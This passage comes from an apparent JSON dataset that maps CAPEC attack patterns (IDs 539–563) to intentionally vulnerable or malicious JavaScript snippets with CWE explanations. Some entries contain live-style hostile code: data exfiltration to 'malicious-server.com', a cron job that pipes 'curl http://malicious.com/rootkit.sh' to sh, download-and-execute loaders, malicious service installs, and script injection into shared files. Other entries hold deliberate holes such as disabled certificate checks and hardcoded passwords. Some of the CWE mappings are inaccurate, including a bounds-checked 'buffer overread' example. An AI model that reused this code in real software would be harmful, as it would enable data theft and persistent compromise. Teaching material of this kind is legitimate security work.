        "description": "This JavaScript code snippet demonstrates the concept of 'Open-Source Library Manipulation' by downloading and executing a potentially malicious library without performing any integrity checks. The code uses the 'https' module to fetch a JavaScript file from a remote server (CWE-494: Download of Code Without Integrity Check). It then writes the downloaded content to a local file and immediately requires it, thereby executing the code (CWE-506: Embedded Malicious Code and CWE-829: Inclusion of Functionality from Untrusted Control Sphere). This represents the risk of incorporating untrusted and potentially harmful code into a project, which is the main idea of the CAPEC."
    },
    {
        "capec_id": "539",
        "capec_name": "ASIC With Malicious Functionality",
        "code_snippet": "class ASIC {\n  constructor() {\n    this.securityToken = 'secureToken123'; // CWE-1259: Improper Restriction of Security Token Assignment\n    this.debugMode = true; // CWE-11: ASP.NET Misconfiguration: Creating Debug Binary\n  }\n\n  getSensitiveInfo() {\n    if (this.debugMode) {\n      console.log('Debug Info: Sensitive system information'); // CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n    }\n    return 'Sensitive system information';\n  }\n\n  maliciousFunction() { // CWE-506: Embedded Malicious Code\n    console.log('Executing malicious functionality');\n    // Malicious code that disrupts or compromises the system\n  }\n}\n\nconst asic = new ASIC();\nasic.maliciousFunction();\nconsole.log(asic.getSensitiveInfo());",
        "description": "This JavaScript code snippet represents an ASIC (Application-Specific Integrated Circuit) class that embodies the main idea of CAPEC-ASIC With Malicious Functionality. The class includes a security token (CWE-1259) that is improperly protected, a debug mode (CWE-11) that exposes sensitive system information (CWE-497), and a malicious function (CWE-506) that disrupts or compromises the system. The code demonstrates how an attacker with access to the development environment can insert malicious functionality into the system."
    },
    {
        "capec_id": "540",
        "capec_name": "Overread Buffers",
        "code_snippet": "function readBuffer(buffer, index) {\n  if (index < 0 || index >= buffer.length) {\n    console.log('Index out of bounds');\n    return null;\n  }\n  return buffer[index];\n}\n\nconst buffer = [1, 2, 3, 4, 5];\nconst index = 10; // Out-of-bounds index\nconst value = readBuffer(buffer, index);\nconsole.log('Value:', value);",
        "description": "This JavaScript code snippet demonstrates a potential buffer over-read vulnerability. The function `readBuffer` attempts to read a value from a buffer array at a specified index. If the index is out of the buffer's bounds (either less than 0 or greater than or equal to the buffer's length), it logs an 'Index out of bounds' message and returns null. However, the code still allows for the possibility of an out-of-bounds read if the index check is bypassed or improperly handled. The example sets an out-of-bounds index (10) to illustrate the vulnerability. This code represents the main idea of CAPEC-129 (Overread Buffers) and is related to CWEs such as CWE-125 (Out-of-bounds Read) and CWE-126 (Buffer Over-read)."
    },
    {
        "capec_id": "541",
        "capec_name": "Application Fingerprinting",
        "code_snippet": "const http = require('http');\n\nhttp.createServer((req, res) => {\n  if (req.url === '/version') {\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end('Application Version: 1.0.0');\n  } else if (req.url === '/status') {\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end('Status: Running');\n  } else {\n    res.writeHead(404, {'Content-Type': 'text/plain'});\n    res.end('Not Found');\n  }\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code creates a simple HTTP server using Node.js. The server responds to different URLs with specific information. If the URL is '/version', it reveals the application version, and if the URL is '/status', it reveals the application's running status. For any other URL, it returns a 404 Not Found response. This code snippet embodies the concept of 'Application Fingerprinting' (CAPEC-170) by providing different responses based on the request URL, which can be used by an adversary to determine the type or version of the application. The related CWEs are represented as follows: CWE-204 (Observable Response Discrepancy) is shown by the different responses for different URLs, CWE-205 (Observable Behavioral Discrepancy) is demonstrated by the different behaviors for each URL, and CWE-208 (Observable Timing Discrepancy) could be inferred if the response times vary based on the URL."
    },
    {
        "capec_id": "542",
        "capec_name": "Targeted Malware",
        "code_snippet": "const fs = require('fs');\nconst http = require('http');\n\n// Trojan Horse: Malicious code hidden in seemingly benign functionality\nfunction downloadFile(url, dest) {\n  const file = fs.createWriteStream(dest);\n  http.get(url, (response) => {\n    response.pipe(file);\n    file.on('finish', () => {\n      file.close(() => {\n        // Embedded Malicious Code: Executes hidden malicious payload\n        executeMaliciousPayload();\n      });\n    });\n  });\n}\n\n// Spyware: Collects sensitive information without user consent\nfunction executeMaliciousPayload() {\n  const sensitiveData = fs.readFileSync('/path/to/sensitive/data.txt', 'utf8');\n  http.request({\n    hostname: 'malicious-server.com',\n    port: 80,\n    path: '/collect',\n    method: 'POST',\n    headers: {\n      'Content-Type': 'application/json'\n    }\n  }, (res) => {\n    res.on('data', (chunk) => {});\n    res.on('end', () => {});\n  }).write(JSON.stringify({ data: sensitiveData }));\n}\n\ndownloadFile('http://example.com/benign-file.txt', '/tmp/benign-file.txt');",
        "description": "This JavaScript code snippet demonstrates a targeted malware attack that leverages multiple weaknesses. The `downloadFile` function appears to perform a benign task of downloading a file from a URL, but it contains hidden malicious code that executes once the file is downloaded. This represents a Trojan Horse (CWE-507). The `executeMaliciousPayload` function reads sensitive data from the system and sends it to a remote server without user consent, embodying both Embedded Malicious Code (CWE-506) and Spyware (CWE-512). The code snippet illustrates how targeted malware can exploit known vulnerabilities to achieve unauthorized access and data exfiltration."
    },
    {
        "capec_id": "543",
        "capec_name": "Counterfeit Websites",
        "code_snippet": "const http = require('http');\nconst url = require('url');\n\nhttp.createServer((req, res) => {\n  const queryObject = url.parse(req.url, true).query;\n  const redirectUrl = queryObject.redirect;\n\n  if (redirectUrl) {\n    res.writeHead(302, { 'Location': redirectUrl });\n    res.end();\n  } else {\n    res.writeHead(200, { 'Content-Type': 'text/html' });\n    res.write('<html><body><h1>Welcome to the counterfeit site!</h1></body></html>');\n    res.end();\n  }\n}).listen(8080);\n\nconsole.log('Server running at http://127.0.0.1:8080/');",
        "description": "This JavaScript code snippet creates a simple HTTP server using Node.js. The server listens for incoming requests and checks if a 'redirect' query parameter is present in the URL. If the 'redirect' parameter is found, the server performs an open redirect to the specified URL (CWE-601). If not, it serves a basic HTML page that could be a counterfeit version of a legitimate site. This counterfeit site can be used to gather user information or upload malware (CAPEC-409). The code demonstrates how an attacker might exploit open redirects to facilitate phishing attacks and create counterfeit websites."
    },
    {
        "capec_id": "544",
        "capec_name": "Counterfeit Organizations",
        "code_snippet": "const https = require('https');\n\nfunction fetchData(url) {\n  const options = {\n    hostname: 'fake-supplier.com',\n    port: 443,\n    path: '/data',\n    method: 'GET',\n    rejectUnauthorized: false // CWE-295: Improper Certificate Validation\n  };\n\n  const req = https.request(options, (res) => {\n    let data = '';\n\n    res.on('data', (chunk) => {\n      data += chunk;\n    });\n\n    res.on('end', () => {\n      console.log('Received data:', data);\n    });\n  });\n\n  req.on('error', (e) => {\n    console.error(`Problem with request: ${e.message}`);\n  });\n\n  req.end();\n}\n\nfetchData('https://legitimate-supplier.com/data'); // CWE-941: Incorrectly Specified Destination in a Communication Channel",
        "description": "This JavaScript code snippet demonstrates a scenario where an adversary creates a counterfeit organization (fake-supplier.com) that appears to be a legitimate supplier. The code fetches data from this fake supplier without properly validating the SSL certificate (CWE-295: Improper Certificate Validation), making it vulnerable to man-in-the-middle attacks. Additionally, the code incorrectly specifies the destination in the communication channel (CWE-941: Incorrectly Specified Destination in a Communication Channel), leading to data being fetched from the counterfeit organization instead of the legitimate one. This embodies the main idea of the CAPEC by showing how an adversary can inject corrupted or malicious components into the supply chain through a counterfeit organization."
    },
    {
        "capec_id": "545",
        "capec_name": "Pull Data from System Resources",
        "code_snippet": "const fs = require('fs');\n\n// Function to read sensitive data from a file\nfunction readSensitiveData(filePath) {\n    try {\n        let data = fs.readFileSync(filePath, 'utf8');\n        console.log('Sensitive Data:', data);\n    } catch (err) {\n        console.error('Error reading file:', err);\n    }\n}\n\n// Simulate reading sensitive data from a system resource\nreadSensitiveData('/path/to/sensitive/file.txt');\n\n// Function to clear sensitive data (improperly)\nfunction clearSensitiveData(filePath) {\n    try {\n        fs.writeFileSync(filePath, ''); // Improper zeroization\n        console.log('Sensitive data cleared.');\n    } catch (err) {\n        console.error('Error clearing file:', err);\n    }\n}\n\n// Simulate clearing sensitive data\nclearSensitiveData('/path/to/sensitive/file.txt');",
        "description": "This JavaScript code snippet demonstrates the concept of 'Pull Data from System Resources' (CAPEC-118). The `readSensitiveData` function reads and prints sensitive data from a specified file, simulating an adversary pulling data from system resources. The `clearSensitiveData` function attempts to clear the sensitive data by writing an empty string to the file, representing improper zeroization (CWE-1239). This improper handling of sensitive data can lead to exposure of sensitive information (CWE-1258, CWE-1330). The code highlights the risks associated with not properly managing and clearing sensitive data from system resources."
    },
    {
        "capec_id": "546",
        "capec_name": "Incomplete Data Deletion in a Multi-Tenant Environment",
        "code_snippet": "const fs = require('fs');\nconst path = '/path/to/multi-tenant/storage';\n\nfunction deleteTenantData(tenantId) {\n  const tenantDataPath = `${path}/${tenantId}`;\n  if (fs.existsSync(tenantDataPath)) {\n    fs.readdirSync(tenantDataPath).forEach(file => {\n      const filePath = `${tenantDataPath}/${file}`;\n      fs.writeFileSync(filePath, ''); // CWE-312: Cleartext Storage of Sensitive Information\n      fs.unlinkSync(filePath); // CWE-1266: Improper Scrubbing of Sensitive Data from Decommissioned Device\n    });\n    fs.rmdirSync(tenantDataPath);\n  }\n}\n\nfunction allocateStorageToNewTenant(newTenantId) {\n  const newTenantDataPath = `${path}/${newTenantId}`;\n  if (!fs.existsSync(newTenantDataPath)) {\n    fs.mkdirSync(newTenantDataPath);\n  }\n  // Potentially CWE-284: Improper Access Control if not properly managed\n}\n\n// Example usage\ndeleteTenantData('tenant123');\nallocateStorageToNewTenant('tenant456');",
        "description": "This JavaScript code snippet demonstrates a scenario where data from a former tenant in a multi-tenant environment is deleted and storage is reallocated to a new tenant. The `deleteTenantData` function attempts to delete the data of a specified tenant by clearing the contents of each file (CWE-312) and then deleting the files (CWE-1266). The `allocateStorageToNewTenant` function creates a new directory for a new tenant, potentially leading to improper access control issues (CWE-284) if not managed correctly. This code embodies the main idea of CAPEC by highlighting the risks associated with incomplete data deletion in a multi-tenant environment, which could allow new tenants to access residual sensitive information."
    },
    {
        "capec_id": "547",
        "capec_name": "Physical Destruction of Device or Component",
        "code_snippet": "class Device {\n  constructor() {\n    this.data = 'Sensitive Information';\n  }\n\n  destroy() {\n    // CWE-1082: Class Instance Self Destruction Control Element\n    delete this;\n  }\n\n  removeData() {\n    // CWE-1301: Insufficient or Incomplete Data Removal within Hardware Component\n    this.data = null; // Incomplete data removal\n  }\n\n  // CWE-1087: Class with Virtual Method without a Virtual Destructor\n  virtualMethod() {\n    console.log('This is a virtual method');\n  }\n}\n\n// Simulating physical destruction\nlet device = new Device();\ndevice.removeData();\ndevice.destroy();\n\n// CWE-1300: Improper Protection of Physical Side Channels\n// Simulating a side-channel attack by observing power consumption\nfunction observePowerConsumption() {\n  console.log('Observing power consumption...');\n}\n\nobservePowerConsumption();\n\n// CWE-1334: Unauthorized Error Injection Can Degrade Hardware Redundancy\nfunction injectError() {\n  console.log('Injecting error into redundant block...');\n}\n\ninjectError();",
        "description": "This JavaScript code snippet represents the concept of 'Physical Destruction of Device or Component' by simulating various vulnerabilities related to physical attacks on a device. The 'Device' class includes a method to destroy itself (CWE-1082), a method to remove data incompletely (CWE-1301), and a virtual method without a virtual destructor (CWE-1087). The code also simulates observing power consumption to represent a side-channel attack (CWE-1300) and injecting errors to degrade hardware redundancy (CWE-1334). The main idea is to demonstrate how physical attacks and related vulnerabilities can compromise a device's functionality and security."
    },
    {
        "capec_id": "548",
        "capec_name": "Contaminate Resource",
        "code_snippet": "const sensitiveData = 'TopSecretInformation';\n\n// CWE-319: Cleartext Transmission of Sensitive Information\nfunction sendSensitiveData() {\n  const xhr = new XMLHttpRequest();\n  xhr.open('POST', 'http://example.com/submit', true);\n  xhr.setRequestHeader('Content-Type', 'text/plain');\n  xhr.send(sensitiveData); // Transmitting sensitive data in cleartext\n}\n\n// CWE-922: Insecure Storage of Sensitive Information\nlocalStorage.setItem('sensitiveData', sensitiveData); // Storing sensitive data insecurely\n\n// CWE-212: Improper Removal of Sensitive Information Before Storage or Transfer\nfunction shareResource() {\n  const resource = { data: sensitiveData, publicInfo: 'Public Information' };\n  // Sharing resource without removing sensitive information\n  return JSON.stringify(resource);\n}\n\n// CWE-226: Sensitive Information in Resource Not Removed Before Reuse\nfunction reuseResource() {\n  let resource = sensitiveData;\n  // Reusing resource without clearing sensitive information\n  resource = 'NewData';\n  return resource;\n}\n\n// CWE-402: Transmission of Private Resources into a New Sphere\nfunction leakResource() {\n  const privateResource = sensitiveData;\n  // Leaking private resource to an untrusted party\n  return privateResource;\n}\n\nsendSensitiveData();\nlocalStorage.setItem('sensitiveData', sensitiveData);\nconsole.log(shareResource());\nconsole.log(reuseResource());\nconsole.log(leakResource());",
        "description": "This JavaScript code snippet demonstrates several vulnerabilities related to the 'Contaminate Resource' CAPEC. The code includes examples of cleartext transmission of sensitive information (CWE-319), insecure storage of sensitive information (CWE-922), improper removal of sensitive information before storage or transfer (CWE-212), sensitive information in resource not removed before reuse (CWE-226), and transmission of private resources into a new sphere (CWE-402). The main idea is to show how an adversary can contaminate organizational information systems by mishandling sensitive information, leading to potential data spills and system unavailability."
    },
    {
        "capec_id": "549",
        "capec_name": "Local Execution of Code",
        "code_snippet": "const http = require('http');\nconst fs = require('fs');\n\nhttp.get('http://untrusted-source.com/malicious.js', (res) => {\n  let data = '';\n  res.on('data', (chunk) => { data += chunk; });\n  res.on('end', () => {\n    fs.writeFile('malicious.js', data, (err) => {\n      if (err) throw err;\n      console.log('Downloaded malicious.js');\n      require('./malicious.js'); // Execute the downloaded code\n    });\n  });\n}).on('error', (err) => {\n  console.error('Error downloading the file:', err.message);\n});",
        "description": "This JavaScript code snippet demonstrates a scenario where a script downloads and executes code from an untrusted source without performing any integrity checks. The code uses the 'http' module to fetch a JavaScript file from a remote location and the 'fs' module to save it locally. Once saved, the script immediately requires and executes the downloaded file. This embodies the CAPEC 'Local Execution of Code' by showing how an adversary could introduce and run malicious code on a target system. The code also highlights CWE-494 (Download of Code Without Integrity Check) and CWE-829 (Inclusion of Functionality from Untrusted Control Sphere) by not verifying the origin or integrity of the downloaded code."
    },
    {
        "capec_id": "550",
        "capec_name": "Install New Service",
        "code_snippet": "const { exec } = require('child_process');\n\n// Vulnerable code: Adding a new service to be executed at startup\nexec('sc create MyService binPath= \"C:\\\\path\\\\to\\\\malicious.exe\" start= auto', (error, stdout, stderr) => {\n  if (error) {\n    console.error(`Error: ${error.message}`);\n    return;\n  }\n  if (stderr) {\n    console.error(`Stderr: ${stderr}`);\n    return;\n  }\n  console.log(`Stdout: ${stdout}`);\n});",
        "description": "This JavaScript code snippet demonstrates a vulnerability where a new service is installed to be executed at startup on a Windows system. The 'exec' function from the 'child_process' module is used to run the 'sc create' command, which creates a new service named 'MyService' that points to a potentially malicious executable. This service is set to start automatically. This embodies the CAPEC 'Install New Service' by showing how an adversary might install a new service that runs with elevated privileges. The related CWEs are represented by the potential misuse of access control (CWE-284), the use of default or insecure settings (CWE-1188), and the potential for elevated access (CWE-520)."
    },
    {
        "capec_id": "551",
        "capec_name": "Modify Existing Service",
        "code_snippet": "const fs = require('fs');\nconst exec = require('child_process').exec;\n\n// CWE-284: Improper Access Control\nfs.chmod('/etc/systemd/system/my-service.service', 0o777, (err) => {\n  if (err) throw err;\n  console.log('Permissions changed to 777');\n\n  // CWE-15: External Control of System or Configuration Setting\n  exec('systemctl enable my-service', (error, stdout, stderr) => {\n    if (error) {\n      console.error(`exec error: ${error}`);\n      return;\n    }\n    console.log(`stdout: ${stdout}`);\n    console.error(`stderr: ${stderr}`);\n  });\n});",
        "description": "This JavaScript code snippet demonstrates a potential security vulnerability by modifying an existing service. It first changes the permissions of a service configuration file to be world-writable (CWE-284: Improper Access Control), allowing any user to modify it. Then, it enables the service using an external command (CWE-15: External Control of System or Configuration Setting). This could lead to unauthorized users enabling or modifying services, potentially breaking existing services or enabling insecure ones."
    },
    {
        "capec_id": "552",
        "capec_name": "Install Rootkit ",
        "code_snippet": "const http = require('http');\nconst fs = require('fs');\nconst exec = require('child_process').exec;\n\nhttp.createServer((req, res) => {\n  if (req.url === '/install') {\n    const maliciousCode = `\n      const fs = require('fs');\n      fs.writeFile('/etc/cron.d/rootkit', '* * * * * root /bin/bash -c \"curl http://malicious.com/rootkit.sh | sh\"', (err) => {\n        if (err) throw err;\n      });\n    `;\n    fs.writeFile('/tmp/malicious.js', maliciousCode, (err) => {\n      if (err) throw err;\n      exec('node /tmp/malicious.js', (error, stdout, stderr) => {\n        if (error) {\n          console.error(`exec error: ${error}`);\n          return;\n        }\n        console.log(`stdout: ${stdout}`);\n        console.error(`stderr: ${stderr}`);\n      });\n    });\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end('Malicious code installed');\n  } else {\n    res.writeHead(404, {'Content-Type': 'text/plain'});\n    res.end('Not Found');\n  }\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet sets up an HTTP server that listens for requests. When a request is made to the '/install' endpoint, it writes and executes a malicious script that installs a cron job to periodically download and execute a rootkit from a remote server. This demonstrates the CAPEC of installing a rootkit by exploiting improper access control (CWE-284) and embedding malicious code (CWE-506). The code also represents a Trojan Horse (CWE-507) as it appears to be a benign server but contains hidden malicious functionality. Additionally, it exposes sensitive system information (CWE-497) and is vulnerable to OS command injection (CWE-78) by executing shell commands based on external input."
    },
    {
        "capec_id": "554",
        "capec_name": "Functionality Bypass",
        "code_snippet": "function isAdmin() {\n  // Client-side check for admin privileges\n  return localStorage.getItem('userRole') === 'admin';\n}\n\nfunction accessRestrictedArea() {\n  if (isAdmin()) {\n    console.log('Access granted to restricted area.');\n  } else {\n    console.log('Access denied.');\n  }\n}\n\n// Simulate an attacker bypassing the client-side check\nlocalStorage.setItem('userRole', 'admin');\naccessRestrictedArea();",
        "description": "This JavaScript code snippet demonstrates a functionality bypass vulnerability by relying on client-side enforcement of server-side security (CWE-602). The `isAdmin` function checks if the user has admin privileges by reading a value from `localStorage`. The `accessRestrictedArea` function grants or denies access based on this check. An attacker can easily bypass this protection by setting the `userRole` in `localStorage` to 'admin', thus gaining unauthorized access to the restricted area. This example embodies the main idea of the CAPEC by showing how an adversary can bypass intended protections due to improper protection mechanisms and reliance on client-side checks."
    },
    {
        "capec_id": "555",
        "capec_name": "Remote Services with Stolen Credentials",
        "code_snippet": "const http = require('http');\nconst crypto = require('crypto');\n\nconst users = {\n  'admin': 'password123' // CWE-521: Weak Password Requirements\n};\n\nhttp.createServer((req, res) => {\n  const auth = req.headers['authorization'];\n  if (!auth) {\n    res.writeHead(401, {'WWW-Authenticate': 'Basic realm=\"Secure Area\"'});\n    res.end('Authorization required');\n    return;\n  }\n\n  const [scheme, encoded] = auth.split(' ');\n  if (scheme !== 'Basic') {\n    res.writeHead(400);\n    res.end('Invalid authentication scheme');\n    return;\n  }\n\n  const [username, password] = Buffer.from(encoded, 'base64').toString().split(':');\n  if (users[username] && users[username] === password) {\n    res.writeHead(200);\n    res.end('Welcome!');\n  } else {\n    res.writeHead(403);\n    res.end('Forbidden');\n  }\n}).listen(8080);\n\nconsole.log('Server running at http://127.0.0.1:8080/');",
        "description": "This JavaScript code snippet creates a basic HTTP server that uses Basic Authentication to protect access. The server checks for an 'Authorization' header and decodes the credentials. If the credentials match the hardcoded username and password, access is granted. This code embodies the CAPEC 'Remote Services with Stolen Credentials' by demonstrating how an attacker could leverage weak authentication mechanisms (CWE-521: Weak Password Requirements) to gain unauthorized access. The use of Basic Authentication without encryption (CWE-522: Insufficiently Protected Credentials) and single-factor authentication (CWE-308: Use of Single-factor Authentication) makes it susceptible to credential theft and replay attacks (CWE-294: Authentication Bypass by Capture-replay)."
    },
    {
        "capec_id": "556",
        "capec_name": "Replace File Extension Handlers",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\n// Function to change file extension handler\nfunction replaceFileExtensionHandler(extension, newHandlerPath) {\n  const handlerConfigPath = path.join(__dirname, 'fileHandlers.json');\n  let handlers;\n\n  // Read the current handlers configuration\n  try {\n    handlers = JSON.parse(fs.readFileSync(handlerConfigPath, 'utf8'));\n  } catch (err) {\n    console.error('Error reading handlers configuration:', err);\n    return;\n  }\n\n  // Update the handler for the given extension\n  handlers[extension] = newHandlerPath;\n\n  // Write the updated handlers configuration back to the file\n  try {\n    fs.writeFileSync(handlerConfigPath, JSON.stringify(handlers, null, 2), 'utf8');\n    console.log(`Handler for .${extension} files updated to ${newHandlerPath}`);\n  } catch (err) {\n    console.error('Error writing handlers configuration:', err);\n  }\n}\n\n// Example usage: replace the handler for .txt files\nreplaceFileExtensionHandler('txt', '/path/to/malicious/program');",
        "description": "This JavaScript code snippet demonstrates how an application might replace the file extension handler for a specific file type. The `replaceFileExtensionHandler` function reads a JSON configuration file (`fileHandlers.json`) that maps file extensions to their respective handlers. It then updates the handler for a given file extension to a new path, which could be an arbitrary or malicious program. This embodies the CAPEC 'Replace File Extension Handlers' by showing how an attacker could modify the file handler configuration to execute arbitrary code when a file with the targeted extension is opened. The code also touches on related CWEs by allowing external control of file paths (CWE-73) and potentially relying on file extensions (CWE-646)."
    },
    {
        "capec_id": "557",
        "capec_name": "DEPRECATED: Schedule Software To Run",
        "code_snippet": "const fs = require('fs');\n\n// Using an obsolete function to read a file\nfs.readFile('/path/to/file', 'utf8', function(err, data) {\n  if (err) {\n    return console.log(err);\n  }\n  console.log(data);\n});\n\n// Schedule a task to run at a later time\nsetTimeout(function() {\n  console.log('This task runs after 5 seconds');\n}, 5000);",
        "description": "This JavaScript code snippet demonstrates the use of an obsolete function (`fs.readFile`) to read a file, which aligns with CWE-477 (Use of Obsolete Function). Additionally, it schedules a task to run after a delay using `setTimeout`, which loosely aligns with the deprecated CAPEC concept of scheduling software to run. The code reads the contents of a file and logs it to the console, then schedules a task to log a message after 5 seconds. This example highlights potential issues with using outdated functions and scheduling tasks, which may lead to vulnerabilities if not properly managed."
    },
    {
        "capec_id": "558",
        "capec_name": "Replace Trusted Executable",
        "code_snippet": "const fs = require('fs');\nconst exec = require('child_process').exec;\n\n// CWE-284: Improper Access Control\nfs.chmodSync('/path/to/trusted/executable', '777');\n\n// Replace the trusted executable with a malicious one\nfs.writeFileSync('/path/to/trusted/executable', '#!/bin/bash\\necho \"Malicious code executed\"\\n');\n\n// CWE-78: OS Command Injection\nexec('/path/to/trusted/executable', (error, stdout, stderr) => {\n  if (error) {\n    console.error(`exec error: ${error}`);\n    return;\n  }\n  console.log(`stdout: ${stdout}`);\n  console.error(`stderr: ${stderr}`);\n});",
        "description": "This JavaScript code snippet demonstrates a vulnerability where an attacker exploits improper access control (CWE-284) to replace a trusted executable with a malicious version. The `chmodSync` function is used to change the permissions of the trusted executable, allowing anyone to write to it. The `writeFileSync` function then replaces the trusted executable with a malicious script. Finally, the `exec` function is used to execute the replaced executable, demonstrating how an attacker can inject and execute malicious OS commands (CWE-78). This embodies the main idea of the CAPEC 'Replace Trusted Executable' by showing how an attacker can exploit weaknesses in privilege management and access control to execute malware."
    },
    {
        "capec_id": "559",
        "capec_name": "Orbital Jamming",
        "code_snippet": "const net = require('net');\n\nconst rogueStation = net.createServer((socket) => {\n  socket.on('data', (data) => {\n    // CWE-940: Improper Verification of Source of a Communication Channel\n    console.log('Received data from satellite:', data.toString());\n    // CWE-924: Improper Enforcement of Message Integrity During Transmission\n    const tamperedData = data.toString().replace('original', 'tampered');\n    console.log('Tampered data:', tamperedData);\n    // CWE-923: Improper Restriction of Communication Channel to Intended Endpoints\n    socket.write(tamperedData);\n  });\n});\n\nrogueStation.listen(8080, '0.0.0.0', () => {\n  console.log('Rogue uplink station listening on port 8080');\n});",
        "description": "This JavaScript code snippet simulates a rogue uplink station that intercepts and tampers with data intended for a satellite, embodying the concept of 'Orbital Jamming'. The rogue station listens for incoming data on port 8080. When data is received, it logs the original data (CWE-940: Improper Verification of Source of a Communication Channel), modifies the data (CWE-924: Improper Enforcement of Message Integrity During Transmission), and sends the tampered data back (CWE-923: Improper Restriction of Communication Channel to Intended Endpoints). This demonstrates how an adversary could disrupt satellite communications by sending disruptive signals and tampering with the data being transmitted."
    },
    {
        "capec_id": "560",
        "capec_name": "Use of Known Domain Credentials",
        "code_snippet": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\nconst users = {\n  'admin': 'password123', // CWE-522: Insufficiently Protected Credentials\n};\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  if (users[username] && users[username] === password) {\n    res.send('Login successful');\n  } else {\n    res.send('Login failed');\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server is running on port 3000');\n});",
        "description": "This JavaScript code snippet represents a simple Express.js server with a login endpoint. The server uses a hardcoded username and password for authentication, which embodies the main idea of CAPEC-Use of Known Domain Credentials. The code is vulnerable to several weaknesses: \n1. CWE-522: The credentials are stored in plaintext within the code, making them insufficiently protected.\n2. CWE-307: There is no mechanism to prevent multiple failed authentication attempts, making it susceptible to brute force attacks.\n3. CWE-308: The authentication mechanism relies on single-factor authentication (username and password).\n4. CWE-309: The primary means of authentication is a password system, which has inherent flaws.\n5. CWE-262 and CWE-263: There is no password aging mechanism implemented.\n6. CWE-654: The security decision relies solely on the evaluation of the username and password.\n\nThis code demonstrates how an adversary could exploit these weaknesses to guess or obtain legitimate credentials and perform authorized actions under the guise of an authenticated user."
    },
    {
        "capec_id": "561",
        "capec_name": "Windows Admin Shares with Stolen Credentials",
        "code_snippet": "const net = require('net');\nconst fs = require('fs');\n\nconst credentials = { username: 'admin', password: 'password123' }; // CWE-521: Weak Password Requirements\n\nconst client = new net.Socket();\nclient.connect(445, '192.168.1.100', () => {\n  console.log('Connected to Windows Admin Share');\n  client.write(`AUTH ${credentials.username} ${credentials.password}`); // CWE-522: Insufficiently Protected Credentials\n});\n\nclient.on('data', (data) => {\n  console.log('Received: ' + data);\n  client.destroy(); // close the connection\n});\n\nclient.on('close', () => {\n  console.log('Connection closed');\n});\n\n// CWE-308: Use of Single-factor Authentication\n// CWE-309: Use of Password System for Primary Authentication\n// CWE-294: Authentication Bypass by Capture-replay\n// CWE-263: Password Aging with Long Expiration\n// CWE-262: Not Using Password Aging",
        "description": "This JavaScript code snippet demonstrates a connection to a Windows Admin Share using hardcoded, weak credentials. The code uses the 'net' module to create a socket connection to a specified IP address and port (445, commonly used for SMB). The credentials are transmitted in plain text, representing CWE-522 (Insufficiently Protected Credentials). The use of a weak password (CWE-521) and single-factor authentication (CWE-308) is evident. The code does not implement any password aging mechanism (CWE-262) or protection against capture-replay attacks (CWE-294). This snippet embodies the main idea of the CAPEC by showing how an adversary could use stolen or guessed credentials to access Windows Admin Shares."
    },
    {
        "capec_id": "562",
        "capec_name": "Modify Shared File",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\n// Path to the shared directory\nconst sharedDir = '/path/to/shared/dir';\n\n// Malicious script to be injected\nconst maliciousScript = '<script>alert(\"Hacked!\");</script>';\n\n// Function to inject malicious script into shared files\nfunction injectMaliciousScript() {\n  fs.readdir(sharedDir, (err, files) => {\n    if (err) {\n      console.error('Error reading directory:', err);\n      return;\n    }\n    files.forEach(file => {\n      const filePath = path.join(sharedDir, file);\n      fs.readFile(filePath, 'utf8', (err, data) => {\n        if (err) {\n          console.error('Error reading file:', err);\n          return;\n        }\n        // Append malicious script to the file content\n        const modifiedContent = data + maliciousScript;\n        fs.writeFile(filePath, modifiedContent, 'utf8', err => {\n          if (err) {\n            console.error('Error writing file:', err);\n          } else {\n            console.log('Injected malicious script into:', filePath);\n          }\n        });\n      });\n    });\n  });\n}\n\n// Execute the function to inject the script\ninjectMaliciousScript();",
        "description": "This JavaScript code snippet demonstrates a potential attack where an adversary manipulates files in a shared directory by injecting a malicious script. The code reads all files in the specified shared directory, appends a malicious script to each file's content, and writes the modified content back to the files. This embodies the CAPEC 'Modify Shared File' by showing how an attacker can add malicious content to shared files. The related CWEs are represented as follows: CWE-284 (Improper Access Control) is implied by the lack of access restrictions to the shared directory, CWE-378 (Creation of Temporary File With Insecure Permissions) is relevant if temporary files are used insecurely during the process, CWE-434 (Unrestricted Upload of File with Dangerous Type) is related to the ability to modify files with dangerous content, CWE-494 (Download of Code Without Integrity Check) is relevant if the files are downloaded without verification, and CWE-433 (Unparsed Raw Web Content Delivery) is represented by the injection of raw script content."
    },
    {
        "capec_id": "563",
        "capec_name": "Add Malicious File to Shared Webroot",
        "code_snippet": "const express = require('express');\nconst fileUpload = require('express-fileupload');\nconst fs = require('fs');\nconst path = require('path');\n\nconst app = express();\napp.use(fileUpload());\n\napp.post('/upload', (req, res) => {\n  if (!req.files || Object.keys(req.files).length === 0) {\n    return res.status(400).send('No files were uploaded.');\n  }\n\n  let uploadedFile = req.files.uploadedFile;\n  let uploadPath = path.join(__dirname, 'uploads', uploadedFile.name);\n\n  uploadedFile.mv(uploadPath, (err) => {\n    if (err) return res.status(500).send(err);\n    res.send('File uploaded!');\n  });\n});\n\napp.get('/uploads/:filename', (req, res) => {\n  let filePath = path.join(__dirname, 'uploads', req.params.filename);\n  res.sendFile(filePath);\n});\n\napp.listen(3000, () => {\n  console.log('Server started on http://localhost:3000');\n});",
